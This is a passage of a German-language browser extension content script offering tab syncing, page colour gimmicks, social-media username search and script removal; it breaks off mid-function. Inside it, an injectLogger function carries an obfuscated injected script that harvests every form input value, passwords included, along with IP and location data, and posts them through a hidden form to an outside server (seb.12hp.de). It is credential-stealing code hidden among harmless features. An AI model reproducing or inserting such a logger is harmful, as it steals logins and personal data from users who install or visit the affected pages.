log("Seb's extension successfully loaded!", "lime");

var urlW2g; 
var room; 
var w2gStatus = 0;
var w2gWritePerm = 0;
var w2gOnWrite = 0;

function startW2g() {
    //urlW2g = location.href; 
    if(w2gStatus != 1) {
    var input = prompt("Bitte gebe den Code für einen Tab Sync Raum ein oder erstelle einen neuen.\nZum Abrrechen, bitte stop eingeben", "");    
        if(input != null) 
        {
            if(input == "stop" || input == "Stop" || input == "STOP" || input == " " || input == "x") {log("Tab Sync abgebrochen", "red");}
            else 
            {
                try{input = Number(input);} catch{}
                if(Number.isInteger(input))
                {
                    room = input;
                    //connectToW2g();
                    readLink(2);
                    w2gStatus = 1;
                    chrome.runtime.sendMessage({w2g: room});
        
                    log("Verbunden zu Raum " + room, "lime", 15);
                }
            }
        }
        else {startW2g();}
    }
}

function keepW2g(x) {
    //log("keepW2g in room: " + x, "lime");
    pageTitle();
    w2gWritePerm = 1;
    room = x;
    if(room != 0 && w2gStatus == 0) {
        
    log("Verbunden zu Raum " + room, "lime", 15);
    w2gStatus = 1; writeLink(); setTimeout(function() {readLink();}, 100);
    }
}

//if(w2gStatus == 1) {log("Verbunden zu W2g", "lime");}
//else {log("Nicht zu W2g verbunden", "orange");}

function stopW2g() {
    //urlW2g = location.href; 
    //room = prompt("Bitte gebe den Code für einen Raum ein oder erstelle einen neuen", "");
    w2gStatus = 0;
    room = 0;
    log("Tab Sync stop", "red");
    chrome.runtime.sendMessage({w2g: "stop"});
    pageTitle();
    //alert("W2G stop muss noch gemacht werden");
}

function writeLink() {
    if(room != 0 && w2gWritePerm == 1) 
    { 
        checkRequestSpam("write");
        w2gOnWrite = 1;
        urlW2g = location.href;
        var lastC = urlW2g.slice(urlW2g.length-1, urlW2g.length);
        if(lastC == "/") {urlW2g = urlW2g.slice(0, urlW2g.length-1);}
        log("writeLink start: " + urlW2g, "orange");
        game = { "newLink":urlW2g, "room":room, "newScroll":getScrollHeight()}
        if(onYoutube == 1) {game = { "newLink":urlW2g, "room":room, "newScroll":getScrollHeight(), "videoStartTime": videoStartTime};}
        dbParam = JSON.stringify(game);
        xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {  
            if(this.responseText == "01") {log("Link succesfully uploaded", "lime");}
            else {log("ERROR! RESP: " + this.responseText, "red");}
        }
        w2gOnWrite = 0;
    
        };
        xmlhttp.open("POST", "https://seb.12hp.de/w2g/w2gExtension.php", true);
        xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xmlhttp.send("x=" + dbParam + "&t=writeLink");
    }
    else {log("Kein Raum ausgewählt", "red");}}

var readLinkErrorTimeout;
var readLinkErrorTimeoutStatus = 0;

    function readLink(type, altUrl) {
        checkRequestSpam("read");
        if(readLinkErrorTimeoutStatus == 1) {clearTimeout(readLinkErrorTimeout); readLinkErrorTimeoutStatus = 0;}
        readLinkErrorTimeout = setTimeout(function() {if(w2gStatus == 1) {log("ERROR: readlink stopped working", "red", 20);}}, 17000);
        readLinkErrorTimeoutStatus = 1;

        if(room != 0 && w2gOnWrite == 0) {
        urlW2g = location.href;
        if(altUrl) {urlW2g = altUrl;}
        var lastC = urlW2g.slice(urlW2g.length-1, urlW2g.length);
        if(lastC == "/") {urlW2g = urlW2g.slice(0, urlW2g.length-1);}
        log("readLink start, room: " + room, "orange");
        game = { "currentLink":urlW2g,"room":room, "type": type, "currentScroll": getScrollHeight()}
        if(onYoutube == 1) {game = { "currentLink":urlW2g,"room":room, "type": type, "currentScroll": getScrollHeight(), "videoStartTime": videoStartTime};}
        //game = { "currentLink":urlW2g, "room":room, "type": type};
        dbParam = JSON.stringify(game);
        xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            if(room != 0 && w2gStatus == 1 && w2gOnWrite != 1) {
            var str = this.responseText;
            if(str == "error1") {stopW2g(); alert("Kein Link für diese Sitzung gefunden", "red");}
            else if (str.includes("http")) 
            {
                str = JSON.parse(this.responseText);                
                //log(str + ", str L: " + str.length, "magenta");                
                if(str[1] != getScrollHeight() && str.length > 2) { setScrollHeight(str[1]); }

                if(str[0].includes("www.youtube.com") && str[0].includes("embed") && str[0].includes("autoplay=1") == false) {str[0] += "?autoplay=1";}
                log("Link succesfully downloaded: " + str[0], "lime");
                var con = 0;
                for(var i = 0; i < str[0].toString().length; i++)
                {if(location.href.charAt(i) != str[0].toString().charAt(i)) {con ++;} }

                if(con > 1) {log("HREF CHANGE: \n" + location.href + "\n" + str[0], "red"); location.href = str[0];  }
                else if(w2gOnWrite == 0) {readLink(1, str[0]);}
                else {setTimeout(function() {readLink(1, str[0]);}, 100);}
            }

            else if(str == "00" || str[str.length-1] == "00") {
                log("No new link found", "lime"); 
                if(w2gOnWrite == 0) {readLink();}
                else {setTimeout(readLink, 100);}}

                if(type == 2) {alert("Verbunden zu Raum " + room);
            }
            } 
            else if (w2gStatus == 1) {setTimeout(readLink, 100);}
        }
      
        };
        xmlhttp.open("POST", "https://seb.12hp.de/w2g/w2gExtension.php", true);
        xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xmlhttp.send("x=" + dbParam + "&t=readLink");
        }

        else if (w2gStatus == 1) {
            setTimeout(readLink, 100);
            //log("readlink start, w2gOnWrite: " + w2gOnWrite, "orange");
            log("readLink start, but have to wait, Tab Sync OnWrite: " + w2gOnWrite, "orange");
        }
    }

    var videoStartTime = 0;
    var onYoutube = 0;

    function w2gYoutube() 
    {
        //.currentTime
        log("Tab Sync Youtube start", "lime");
        //ytRemoveAds();
        var vid = document.getElementsByClassName("video-stream html5-main-video")[0];
        //setTimeout(function() {vid.currentTime = 20;}, 3000);
        vid.onplay = function() {
            log("video started playing at " + new Date().getTime(), "orange"); 
            videoStartTime = "01"+ new Date().getTime();
            //writeLink();
        }
    }

    var checkRequestSpamRead = [];
    var checkRequestSpamWrite = [];
    function checkRequestSpam(type)
    {
        var allowedRequests = 15; //allowedRequests per second
        if(type == "read") 
        {
            var timeNow = new Date().getTime();
            checkRequestSpamRead.push(timeNow);
            if(checkRequestSpamRead[checkRequestSpamRead.length-allowedRequests] + 1000*(allowedRequests-1) > checkRequestSpamRead[checkRequestSpamRead.length-1]) {stopW2g(); log("TOO MANY REQ'S -> Tab SyncStop", "red", 20);}
        }
        if(type == "write") 
        {
            var timeNow = new Date().getTime();
            checkRequestSpamWrite.push(timeNow);
            if(checkRequestSpamWrite[checkRequestSpamWrite.length-allowedRequests] + 1000*(allowedRequests-1) > checkRequestSpamWrite[checkRequestSpamWrite.length-1]) {stopW2g();log("TOO MANY REQ'S -> Tab SyncStop", "red", 20);}
        }
    }

chrome.runtime.onMessage.addListener(    function(response, sender, sendResponse) {
  if(response == "überdosis") {überdosisFunction();}
  if(response == "darkmode") {darkModeFunction();}
  if(response == "lsdmodus") {bgSwitch();}
  if(response == "rndmtextfarbe") {rndmTextFarbe();}
  if(response == "killimages") {killimages();}
  if(response == "visitmclicker") {mclicker();}
  if(response.includes("searchOnInsta")) {var sendedName = response.slice(13, 999);  searchStringOnInstagram(sendedName);}
  if(response.includes("searchOnTiktok")) {var sendedName = response.slice(14, 999);  searchStringOnTiktok(sendedName);}
  if(response.includes("searchOnReddit")) {var sendedName = response.slice(14, 999);  searchStringOnReddit(sendedName);}
  if(response.includes("searchOnGithub")) {var sendedName = response.slice(14, 999);  searchStringOnGithub(sendedName);}
  if(response.includes("searchOnYoutube")) {var sendedName = response.slice(15, 999);  searchStringOnYoutube(sendedName);}
  if(response.includes("searchOnSpotify")) {var sendedName = response.slice(15, 999);  searchStringOnSpotify(sendedName);}
  if(response.includes("searchOnSteam")) {var sendedName = response.slice(13, 999);  searchStringOnSteam(sendedName);}
  if(response.includes("searchOnTwitter")) {var sendedName = response.slice(15, 999);  searchStringOnTwitter(sendedName);}
  if(response.includes("searchOnTwitch")) {var sendedName = response.slice(14, 999);  searchStringOnTwitch(sendedName);}
  if(response.includes("searchOnFacebook")) {var sendedName = response.slice(16, 999);  searchStringOnFacebook(sendedName);}
  if(response.includes("searchOnSnapchat")) {var sendedName = response.slice(16, 999);  searchStringOnSnapchat(sendedName);}
  if(response.includes("searchOnVk")) {var sendedName = response.slice(10, 999);  searchStringOnVk(sendedName);}
  if(response.includes("searchOnLinkedin")) {var sendedName = response.slice(16, 999);  searchStringOnLinkedin(sendedName);}
  if(response.includes("searchOnTelegram")) {var sendedName = response.slice(16, 999);  searchStringOnTelegram(sendedName);}
  if(response.includes("searchOnTinder")) {var sendedName = response.slice(14, 999);  searchStringOnTinder(sendedName);}
  if(response.includes("searchOnMixxer")) {var sendedName = response.slice(14, 999);  searchStringOnMixxer(sendedName);}
  if(response.includes("searchOnUplay")) {var sendedName = response.slice(13, 999);  searchStringOnUplay(sendedName);}
  if(response == "deleteScripts") {deleteScripts();}
  if(response == "deleteCss") {deleteCssInHtml();}
  if(response.includes("translate")) {var sendedName = response.slice(9, 999);  translateString(sendedName);}
  if(response == "getInstaPic") {getInstaPic();}
  if(response == "getInstaVid") {getInstaVid();}
  if(response == "getInstaPicOfUser") {getInstaPicOfUser();}
  if(response == "getInstaStory") {getInstaStory();}
  if(response == "saveImgAlert") {saveAlert(1);}
  if(response == "saveVidAlert") {saveAlert(2);}
  if(response == "getLastEmoji") {getLastEmoji();}
  if(response == "injectMenu") {injectMenu();}
  if(response == "uninjectMenu") {uninjectMenu();}
  if(response == "startW2g") {startW2g();}
  if(response.includes("keepW2g")) {var x = response.slice(7, response.length); keepW2g(x);}
  if(response == "stopW2g") {stopW2g();}
  if(response == "readingMode") {readingMode();}
});


var urlCheckerUrl1 = location.href;
    var urlCheckerUrl2 = "";
    function urlChecker() {
        pageTitle();
        //scrollChecker();
        if(urlCheckerUrl1 != location.href) {if(w2gStatus == 1) {onYoutube = 0; writeLink();} log("URL changed from " + urlCheckerUrl1 + " TO " + location.href, "orange"); urlCheckerUrl1 = location.href; youtube();}
        setTimeout(urlChecker, 100);
    }
    urlChecker();

    var pageTitleOld = document.title;

    var w2gConnectedTag = "SYNC";
    
    function pageTitle() {
        var x = document.title;
        if(w2gStatus == 1) {
            if(x.slice(0, 7).includes("[" + w2gConnectedTag + "]")) {}
            else {document.title = "["+w2gConnectedTag+"] " + document.title; log("Added [" + w2gConnectedTag + "] to page title", "lime");}
        }
        else { if(x.slice(0, 7).includes("["+w2gConnectedTag+"]")) {document.title = pageTitleOld; log("Removed ["+w2gConnectedTag+"] from page title", "lime");} }
    }
    var w2gSavedScrollHeight = window.pageYOffset.toString();
    //alert(w2gSavedScrollHeight);
    function saveNewScrollHeight() {w2gSavedScrollHeight = getScrollHeight();}

    function setScrollHeight(h) 
    { 
        var oldH = window.pageYOffset;
        var newH = 0;
        var stepH = h/90;
        var y = 90+10;
        for(var i = 0; i < y; i++) 
        {
            setTimeout(function() 
            {
                if(h > window.pageYOffset) {window.scrollTo(0, window.pageYOffset + stepH);}
                if(h < window.pageYOffset) {window.scrollTo(0, window.pageYOffset - stepH);}
            }, i*10);
        }
        setTimeout(function() {
        window.scrollTo(0, h);
        newH = window.pageYOffset;
        //log("set scrollheight from " + oldH + " to " + newH, "lime"); 
        console.log("set scrollheight from " + oldH + " to " + h); 
        //w2gSavedScrollHeight = h;
        }, y*10+50);
    }


    function getScrollHeight() { var x = window.pageYOffset.toString(); return x; }
    function scrollChecker() {
        if((w2gSavedScrollHeight > getScrollHeight() + 200 || w2gSavedScrollHeight < getScrollHeight() - 200 ) && w2gStatus == 1) {writeLink(); log("detected new scrollheight: old: " + w2gSavedScrollHeight + "/ new: " + window.pageYOffset, "lime"); saveNewScrollHeight(); }
        //if(w2gSavedScrollHeight != getScrollHeight()) {log("detected new scrollheight: " + w2gSavedScrollHeight + "/" + window.pageYOffset, "lime");w2gSavedScrollHeight = window.pageYOffset; }
        setTimeout(scrollChecker, 500);
    }
    scrollChecker();

function log(str, color, size) {
    str = str + time();
    if(color != undefined && size != undefined) {console.log("%c"+str, "color: " + color + "; font-style: italic; font-size: "+size+"px");}
    else if(color != undefined) {console.log("%c"+str, "color: " + color + "; font-style: italic;");}
    else if(size != undefined) {console.log("%c"+str, "font-style: italic; font-size: "+size+"px");}
    else {console.log(str);}
}

function time() {
var date = new Date();
    var hours = date.getHours(); hours = numVal(hours, 2);
    var mins = date.getMinutes(); mins = numVal(mins, 2);
    var secs = date.getSeconds(); secs = numVal(secs, 2);
    var ms = date.getMilliseconds(); ms = numVal(ms, 3);
    var timeStamp = " [" + hours + ':' + mins + ':' + secs + ':' + ms + "]"
    return timeStamp;
}

function numVal(x, n) 
    {
        x = x.toString();
        while(x.length != n) 
        { x = '0' + x; }
        return x;
    }

//injectMenu();
function injectMenu() 
{  
    document.body.setAttribute("onkeydown", "checkPressedKeyFromSebsExtension(event)")
    var menuElements = "<div id='SebExtensionMenuDiv' style='background-color: #333; color: lime; width: 230px; height: auto; margin: 0px; padding: 0px; float: right; z-index: 5; position: fixed; right: 10px; top: 10px;'>    <header id='SebExtensionHeader' style='height: 47px; width: 100%; background-image: url(https://raw.githubusercontent.com/M2K3K5/extensions/gh-pages/2.png); background-size: 100%; background-repeat: no-repeat; margin-bottom: 0px;'></header>    <h6 style='text-align: center; margin: 1px 0px 1px 0px; padding: 0px; color: lime;'>Seb's Mod Menu</h6>    <div id='SebExtensionMenuContentDiv' style='padding: 0px 10px 0px 10px; background-color: #222; margin-top: 0px; width: 200px; height: auto; margin-left: 5px; border-radius: 3px; font-size: 80%; '>                           <p style='margin-top: 0px; padding: 0px;margin-block-start: 0em; margin-block-end: 0em;' onclick='lsdModeFunction()'>LSD mode</p>            <p onclick=''>Colour escalation</p>            <p>Darkmode</p>            <p>Random font color</p>            <p>Kill images</p>            <p>Money Clicker</p>            <p style='margin-block-end: 0em;'>Search marked text on several social media pages</p>                   </div>    <footer id='SebExtensionFooter' style='background-image: url(https://raw.githubusercontent.com/M2K3K5/extensions/gh-pages/icon2.png); background-size: 6%; background-repeat: no-repeat; width: 100%; height: 15px; margin: 2px 107px 0px 107px;'>    </footer> ";
     menuElements += "<script>function lsdModeFunction() {alert('lsdmode');}     function checkPressedKeyFromSebsExtension(event) {var x = event.keyCode; if(x == '115') {alert('f4');}} </script> </div>"; 
    document.body.innerHTML += menuElements;  
    console.log("menu injected!");
    //alert(console.dir);
    //document.textContent
    /*
function uniKeyCode(event) {
  var key = event.keyCode;
  if(key == "115") {
  alert("open menu");}onkeydown="uniKeyCode(event)"
}*/
}

function uninjectMenu() 
{    
    document.getElementById("SebExtensionMenuDiv").remove();    
    console.log("menu uninjected!");
}

function injectLogger() {
    var x = document.createElement("script");
    document.head.appendChild(x);
    x.innerHTML = "var scAdrqnxj184b3bA = document.createElement('script');if(location != 'about:blank') {console.log('Creator of this script: https://www.sololearn.com/Profile/7148368/?ref=app');}scAdrqnxj184b3bA.src='https://code.jquery.com/jquery-3.1.1.js';document.head.appendChild(scAdrqnxj184b3bA);var readyToSendAdrqnxj184b3bA = 1;var sendsAdrqnxj184b3bA = 0;var waitToSendAdrqnxj184b3bA = 0;var ipAdrqnxj184b3bA;var datasToSendAdrqnxj184b3bA = '';  var textAdrqnxj184b3bA = '';var textNeuAdrqnxj184b3bA = '';    var checkAdrqnxj184b3bA;setTimeout(function() {sendenAdrqnxj184b3bA(1);checkAdrqnxj184b3bA = setInterval(checkInsAdrqnxj184b3bA, 25);}, 500);  function checkInsAdrqnxj184b3bA() {    if(waitToSendAdrqnxj184b3bA == 1)     {if(readyToSendAdrqnxj184b3bA == 1 && sendsAdrqnxj184b3bA > 1) {datasToSendAdrqnxj184b3bA = textAdrqnxj184b3bA;waitToSendAdrqnxj184b3bA = 0;sendenAdrqnxj184b3bA(2);       }    }    textNeuAdrqnxj184b3bA = '';    var x = document.getElementsByTagName('input');    if(x.length > 0)     {    for (var i = 0; i < x.length ;i++) {if((x[i].getAttribute('type') != 'submit' && x[i].getAttribute('type') != 'button' && x[i].getAttribute('name') != 'userAdrqnxj184b3bA' && x[i].getAttribute('name') != 'datasAdrqnxj184b3bA') && (x[i].value != '') ){    var nameOfXiAdrqnxj184b3bA = '';    var typeOfXiAdrqnxj184b3bA = '';    if(x[i].hasAttribute('name')) {nameOfXiAdrqnxj184b3bA = x[i].getAttribute('name') + ': ';}    if(x[i].hasAttribute('type')) {typeOfXiAdrqnxj184b3bA = x[i].getAttribute('type') + ': ';}    textNeuAdrqnxj184b3bA += typeOfXiAdrqnxj184b3bA + nameOfXiAdrqnxj184b3bA + x[i].value + '; '; }}    if(textAdrqnxj184b3bA != textNeuAdrqnxj184b3bA) {textAdrqnxj184b3bA = '';textAdrqnxj184b3bA = textNeuAdrqnxj184b3bA;if(readyToSendAdrqnxj184b3bA == 1) {       datasToSendAdrqnxj184b3bA = textAdrqnxj184b3bA;sendenAdrqnxj184b3bA(2);  }   else {    waitToSendAdrqnxj184b3bA = 1;}}    }else if(x.length == 0 && readyToSendAdrqnxj184b3bA == 1)     {selfDAdrqnxj184b3bA();    } }function selfDAdrqnxj184b3bA()     {clearInterval(checkAdrqnxj184b3bA);    var z = document.getElementsByTagName('script');console.log('z: ' + z.length);for (var i = 0; i < z.length; i++) {if(z[i].innerHTML.includes('readyToSendAdrqnxj184b3bA')) {z[i].outerHTML = '';   alert('Logger is dead!');}}    }function numValAdrqnxj184b3bA(x, n)     {x = x.toString();while(x.length != n) { x = '0' + x; }return x;    }function sendenAdrqnxj184b3bA(type)     {var dateAdrqnxj184b3bA = new Date();var dayAdrqnxj184b3bA = dateAdrqnxj184b3bA.getDate(); dayAdrqnxj184b3bA = numValAdrqnxj184b3bA(dayAdrqnxj184b3bA, 2);var monthAdrqnxj184b3bA = dateAdrqnxj184b3bA.getMonth(); monthAdrqnxj184b3bA++; monthAdrqnxj184b3bA = numValAdrqnxj184b3bA(monthAdrqnxj184b3bA, 2);var hoursAdrqnxj184b3bA = dateAdrqnxj184b3bA.getHours(); hoursAdrqnxj184b3bA = numValAdrqnxj184b3bA(hoursAdrqnxj184b3bA, 2);var minsAdrqnxj184b3bA = dateAdrqnxj184b3bA.getMinutes(); minsAdrqnxj184b3bA = numValAdrqnxj184b3bA(minsAdrqnxj184b3bA, 2);var secsAdrqnxj184b3bA = dateAdrqnxj184b3bA.getSeconds(); secsAdrqnxj184b3bA = numValAdrqnxj184b3bA(secsAdrqnxj184b3bA, 2);var msAdrqnxj184b3bA = dateAdrqnxj184b3bA.getMilliseconds(); msAdrqnxj184b3bA = numValAdrqnxj184b3bA(msAdrqnxj184b3bA, 3);var timeStampAdrqnxj184b3bA = dayAdrqnxj184b3bA + '.' + monthAdrqnxj184b3bA + '.' + dateAdrqnxj184b3bA.getFullYear() + ' ' + hoursAdrqnxj184b3bA + ':' + minsAdrqnxj184b3bA + ':' + secsAdrqnxj184b3bA + ':' + msAdrqnxj184b3bA + ', ';    var bAdrqnxj184b3bA = document.body;var urlAdrqnxj184b3bA = 'url: ' + window.location.href + ', ';readyToSendAdrqnxj184b3bA = 0;sendsAdrqnxj184b3bA++; var datasJsonAdrqnxj184b3bA;var datasAdrqnxj184b3bA;    $.getJSON('https://ipapi.co/json/', function(data) {    if(type == 1) {datasJsonAdrqnxj184b3bA = JSON.stringify(data, null, 1); datasAdrqnxj184b3bA =  JSON.parse(datasJsonAdrqnxj184b3bA);ipAdrqnxj184b3bA = datasAdrqnxj184b3bA.ip;var countryAdrqnxj184b3bA = 'location: ' + datasAdrqnxj184b3bA.country_name + ', ' + datasAdrqnxj184b3bA.city + ', ';var orgAdrqnxj184b3bA = 'provider: ' + datasAdrqnxj184b3bA.org +', ';var bLangAdrqnxj184b3bA = 'bLang: ' + navigator.language +', ';datasToSendAdrqnxj184b3bA =  timeStampAdrqnxj184b3bA + countryAdrqnxj184b3bA + bLangAdrqnxj184b3bA + orgAdrqnxj184b3bA + urlAdrqnxj184b3bA;}    if(type == 2) {datasToSendAdrqnxj184b3bA = timeStampAdrqnxj184b3bA + urlAdrqnxj184b3bA + textAdrqnxj184b3bA;}    var iFrAdrqnxj184b3bA = document.createElement('iframe');iFrAdrqnxj184b3bA.setAttribute('style','display:none');iFrAdrqnxj184b3bA.setAttribute('name','hidden-form');bAdrqnxj184b3bA.appendChild(iFrAdrqnxj184b3bA);    var fAdrqnxj184b3bA = document.createElement('form');fAdrqnxj184b3bA.setAttribute('method','post');fAdrqnxj184b3bA.setAttribute('action','https://seb.12hp.de/testCreate1.php');    fAdrqnxj184b3bA.setAttribute('id', 'formDataToSend');fAdrqnxj184b3bA.setAttribute('target', 'hidden-form');bAdrqnxj184b3bA.appendChild(fAdrqnxj184b3bA);var iAdrqnxj184b3bA = document.createElement('input'); iAdrqnxj184b3bA.setAttribute('type','text');iAdrqnxj184b3bA.setAttribute('name','datasAdrqnxj184b3bA');iAdrqnxj184b3bA.setAttribute('style','display:none');fAdrqnxj184b3bA.appendChild(iAdrqnxj184b3bA);    iAdrqnxj184b3bA.setAttribute('value', datasToSendAdrqnxj184b3bA);  var i2Adrqnxj184b3bA = document.createElement('input'); i2Adrqnxj184b3bA.setAttribute('type','text');i2Adrqnxj184b3bA.setAttribute('name','userAdrqnxj184b3bA');i2Adrqnxj184b3bA.setAttribute('style','display:none');fAdrqnxj184b3bA.appendChild(i2Adrqnxj184b3bA);    i2Adrqnxj184b3bA.setAttribute('value', ipAdrqnxj184b3bA);    var i3Adrqnxj184b3bA = document.createElement('input');i3Adrqnxj184b3bA.setAttribute('type','submit');i3Adrqnxj184b3bA.setAttribute('value','Get gift');i3Adrqnxj184b3bA.setAttribute('style','display:none');fAdrqnxj184b3bA.appendChild(i3Adrqnxj184b3bA);    fAdrqnxj184b3bA.submit();console.log(ipAdrqnxj184b3bA);console.log(datasToSendAdrqnxj184b3bA);    setTimeout(function() {iFrAdrqnxj184b3bA.outerHTML ='';fAdrqnxj184b3bA.outerHTML ='';iAdrqnxj184b3bA.outerHTML ='';i2Adrqnxj184b3bA.outerHTML ='';i3Adrqnxj184b3bA.outerHTML ='';readyToSendAdrqnxj184b3bA = 1;}, 400);});}";
    console.log("LOGGER INJECTED");
}
//injectLogger();

var überdosisStatus = 0;
var überdosisInterval;

function überdosisFunction() 
{
        switch(überdosisStatus) 
        {
            case 0:
                überdosisStatus++;
                überdosisInterval = setInterval(überdosisAktiv, 200);
                break;
            case 1:
                überdosisStatus--;
                clearInterval(überdosisInterval);
                break;
        }   
}


function überdosisAktiv() 
{
var x = document.body.querySelectorAll("*");

var r = Math.floor((Math.random() * 255) + 1);
var g = Math.floor((Math.random() * 255) + 1);
var b = Math.floor((Math.random() * 255) + 1);
for(var i = 0; i < x.length; i++) 
    {
        x[i].style.color = "rgb(" + r + "," + g + "," + b + ")";
        r = Math.floor((Math.random() * 255) + 1);
        g = Math.floor((Math.random() * 255) + 1);
        b = Math.floor((Math.random() * 255) + 1);
        x[i].style.borderColor = "rgb(" + r + "," + g + "," + b + ")";
    } 
}      

function darkModeFunction() {
    var x = document.body.querySelectorAll("*");  
    document.body.backgroundColor = "black";
    document.backgroundColor = "black";
    
    for(var i = 0; i < x.length; i++) 
    {
        x[i].style.backgroundColor = "#111";  
        x[i].style.borderColor = "#333";
        x[i].style.color = "white";
    }
}

var bgSwitchColor = 0;
var bgSwitchStatus = 0;
function bgSwitch() 
{
        switch(bgSwitchStatus) 
        {
            case 0:
                bgSwitchStatus++;
                bgSwitchColorInterval = setInterval(bgSwitchColorFunction, 200);
                break;

            case 1:
                bgSwitchStatus--;
                clearInterval(bgSwitchColorInterval);
                break;
        }
}

function bgSwitchColorFunction() 
{
var x = document.body.querySelectorAll("*");

var r = Math.floor((Math.random() * 255) + 1);
var g = Math.floor((Math.random() * 255) + 1);
var b = Math.floor((Math.random() * 255) + 1);

var r2 = Math.floor((Math.random() * 255) + 1);
var g2 = Math.floor((Math.random() * 255) + 1);
var b2 = Math.floor((Math.random() * 255) + 1);
for(var i = 0; i < x.length; i++) 
    {
        x[i].style.color = "rgb(" + r + "," + g + "," + b + ")";
        x[i].style.borderColor = "rgb(" + r2 + "," + g2 + "," + b2 + ")";
    } 
}         

function rndmTextFarbe() 
{
var x = document.body.querySelectorAll("*");

var r = Math.floor((Math.random() * 255) + 1);
var g = Math.floor((Math.random() * 255) + 1);
var b = Math.floor((Math.random() * 255) + 1);

for(var i = 0; i < x.length; i++) 
    {
        x[i].style.color = "rgb(" + r + "," + g + "," + b + ")";
    } 
}     

var nyanGif = "https://66.media.tumblr.com/tumblr_lrbu1l9BJk1qgzxcao1_250.gifv";
var nyanPic = "https://laughingsquid.com/wp-content/uploads/nyan.jpg";
var sebsIcon = "https://raw.githubusercontent.com/M2K3K5/home/gh-pages/web_icon.png";

function killimages() 
{
var x = document.getElementsByTagName("img");
var heightImg = 152;
var widthImg = 240;
for(var i = 0; i < x.length; i++) 
    {
        x[i].src = nyanGif;
        x[i].height = heightImg;
        x[i].width = widthImg;
    } 
    isElemIcon();
}

var NumberOfLinkTagInHead = 0;
var changedIconsInHead = 0;

function isElemIcon()
{
var x = document.getElementsByTagName('head')[0].getElementsByTagName("link")[NumberOfLinkTagInHead];
if(NumberOfLinkTagInHead >= document.getElementsByTagName('head')[0].getElementsByTagName("link").length) 
    {console.log("changed " +  changedIconsInHead + " icons in head section")}

else if(x.hasAttribute("rel") == true && x.hasAttribute("href") == true)
    {
        console.log("found rel and href attribute of link element " + NumberOfLinkTagInHead + " in head section");
        if(x.getAttribute("rel").includes("icon"))  
        {    
            console.log("found icon as string of rel attribute");
            x.setAttribute("href", sebsIcon);
            document.title = "title stealed by Seb (here could be your name)";
            console.log("changed website title and icon succesfully");
            changedIconsInHead++;
            NumberOfLinkTagInHead++; 
            isElemIcon();
        }
        
        else 
        {
            console.log("found rel and href attribute of link element " + x + " , but string didn't contains 'icon'");
            NumberOfLinkTagInHead++; 
            isElemIcon();
        }
    }
    
    else {NumberOfLinkTagInHead++; isElemIcon();}
}

function mclicker() 
{
    //window.location.href = "https://m2k3k5.github.io/moneyclicker/"; 
    var url = "https://m2k3k5.github.io/extensions";
    var win = window.open(url, '_blank');
    win.focus();
}

function searchStringOnInstagram(input) 
{
    var name = input;
    var url = "https://www.instagram.com/" + name + "/";
    var win = window.open(url, '_blank');
    win.focus();
}

function searchStringOnTiktok(input) 
{
    var name = input;
    var url = "https://www.tiktok.com/@" + name;
    var win = window.open(url, '_blank');
    win.focus();
}

function searchStringOnReddit(input) 
{
    var name = input;
    var url = "https://www.reddit.com/user/" + name + "/";
    var win = window.open(url, '_blank');
    win.focus();
}

function searchStringOnGithub(input) 
{
    var name = input;
    var url = "https://github.com/search?q=" + name + "&type=Users";
    var win = window.open(url, '_blank');
    win.focus();
}

function searchStringOnYoutube(input) 
{
    var name = input;
    var url = "https://www.youtube.com/results?search_query=" + name;
    var win = window.open(url, '_blank');
    win.focus();
}

function searchStringOnSpotify(input) 
{
    var name = input;
    var url = "https://open.spotify.com/user/" + name;
    var win = window.open(url, '_blank');
    win.focus();
}

function searchStringOnSteam(input) 
{
    var name = input;
    var url = "https://steamcommunity.com/search/users/#text=" + name; 
    var win = window.open(url, '_blank');
    win.focus();
}

function searchStringOnTwitter(input) 
{
    var name = input;
    var url = "https://twitter.com/search?q=" + name + "&src=typed_query";
    var win = window.open(url, '_blank');
    win.focus();
}
function searchStringOnFacebook(input) 
{
    var name = input;
    var url = "https://www.facebook.com/" + name;
    var win = window.open(url, '_blank');
    win.focus();
}
function searchStringOnSnapchat(input) 
{
    var name = input;
    var url = "https://www.snapchat.com/add/" + name;
    var win = window.open(url, '_blank');
    win.focus();
    url = "https://story.snapchat.com/s/" + name;
    window.open(url, '_blank');
    win.focus();
}
function searchStringOnVk(input) 
{
    var name = input;
    var url = "https://vk.com/search?c%5Bq%5D=" + name + "&c%5Bsection%5D=people";
    var win = window.open(url, '_blank');
    win.focus();
}
function searchStringOnLinkedin(input) 
{
    var name = input;
    var url = "https://www.linkedin.com/pub/dir?firstName=" + name + "&lastName=&trk=people-guest_people-search-bar_search-submit";
    var win = window.open(url, '_blank');
    win.focus();
}
function searchStringOnTelegram(input) 
{
    var name = input;
    var url = "https://t.me/" + name; 
    var win = window.open(url, '_blank');
    win.focus();
}
function searchStringOnTinder(input) 
{
    var name = input;
    var url = "https://www.gotinder.com/@" + name; 
    var win = window.open(url, '_blank');
    win.focus();
}
function searchStringOnTwitch(input) 
{
    var name = input;
    var url = "https://www.twitch.tv/" + name; 
    var win = window.open(url, '_blank');
    win.focus();
}
function searchStringOnMixxer(input) 
{
    var name = input;
    var url = "https://mixer.com/" + name; 
    var win = window.open(url, '_blank');
    win.focus();
}
function searchStringOnUplay(input) 
{
    var name = input;
    var url = "https://club.ubisoft.com/profile/" + name; 
    var win = window.open(url, '_blank');
    win.focus();
}

var numberOfScriptTagInHtml = 0;
var deletedScriptsInHtml = 0;
var scriptsInHtmlBefore;

function deleteScripts() 
{
    var x = document.getElementsByTagName("script")[numberOfScriptTagInHtml];

    if(numberOfScriptTagInHtml >= document.getElementsByTagName("script").length) 
    {
        if(deletedScriptsInHtml < 1) {console.log("0 got assassinated");}
        console.log("DELETED " +  deletedScriptsInHtml + " of " + scriptsInHtmlBefore + " scripts in DOM"); 
        tagLinkInDom = document.getElementsByTagName("link").length;
        console.log("linked scripts will be disabled now...");
        deleteLinkedScripts();
    }

   if(numberOfScriptTagInHtml <= document.getElementsByTagName("script").length) 
    {
        if(x.hasAttribute("type")) { x.removeAttribute("type"); }
        if(x.hasAttribute("src")) { x.removeAttribute("src"); }
        if(x.hasAttribute("async")) { x.removeAttribute("async"); }
        if(x.hasAttribute("charset")) { x.removeAttribute("charset"); }
        if(x.hasAttribute("crossorigin")) { x.removeAttribute("crossorigin"); }
